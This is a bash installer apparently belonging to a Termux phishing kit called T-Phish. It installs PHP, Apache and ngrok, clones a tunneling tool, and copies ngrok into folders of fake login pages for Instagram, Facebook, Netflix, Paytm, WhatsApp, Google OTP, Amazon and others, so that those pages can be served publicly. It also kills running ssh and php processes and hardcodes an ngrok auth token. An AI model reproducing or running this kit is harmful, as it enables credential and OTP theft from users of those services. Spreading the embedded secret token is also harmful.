#!/bin/bash
echo ""
clear
echo ""
echo ""
echo ""
echo ""
echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m!!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY !!! \e[0m'
sleep 6
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
termux-setup-storage
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
pkg install wget -y
clear

cd $HOME
apt-get update -y
apt-get upgrade -y
pkg install git -y
git clone https://github.com/noob-hackers/tunnel
cd $HOME
#script by noob hackers
#subscribe our youtube channel noob hackers
clear
echo " "
if [ -e $HOME/ngrok ];
then
ping -c1 -i3 google.com
if [ $? -eq 0 ]
then
cd $HOME/tunnel
bash tunnel.sh
exit 0
else
clear
echo " "
printf "              \e[1;91m Turn On Internet Please....!\e[0m\n"
echo " "
cd $HOME/tunnel/do
bash do.sh
fi
echo ' '
printf "              \e[1;92m Ngrok installed and starting....!\e[0m\n"
echo ' '
sleep 3.0
clear
else
clear
echo " "
printf "              \e[1;91m Ngrok Is Installing Wait..../\e[0m\n"
echo " "
sleep 3.0
clear
cd $HOME
pkg install wget -y
pkg install php -y
pkg install python -y
pip install lolcat
pkg install mpv -y
wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip
unzip ngrok-2.2.8-linux-arm64.zip
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm64.zip
clear
echo " "
printf "                  \e[1;91m Ngrok os Starting....!\e[0m\n"
echo " "
sleep 3.0
fi
echo " "
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink

cd $HOME
cp ngrok $HOME/T-Phish/

cp -R ngrok sites/github/
cp -R ngrok sites/Hotstar-otp-bypass/
cp -R ngrok sites/instagram/
cp -R ngrok sites/Linkedin/
cp -R ngrok sites/Netflix/
cp -R ngrok sites/Paytm-Phishing/paytm/
cp -R ngrok sites/Paytm-Phishing/signup/
cp -R ngrok sites/spotify/
cp -R ngrok sites/whatsapp-phishing/
cp -R ngrok sites/facebook-photo/
cp -R ngrok sites/google-otp/
cp -R ngrok sites/instafollow/
cp -R ngrok sites/ipfinder/
cp -R ngrok sites/facebook-verify/
cp -R ngrok sites/facebook-group/
cp -R ngrok sites/facebook/
cp -R ngrok sites/amazonsign/
chmod 7777 phish.sh
./ngrok authtoken 1c8qD8jB4EjReMTQezdZpf3eh7d_6C9suxMRwnBndqyg9ZHy6
clear
echo ""
echo ""
sleep 2
clear
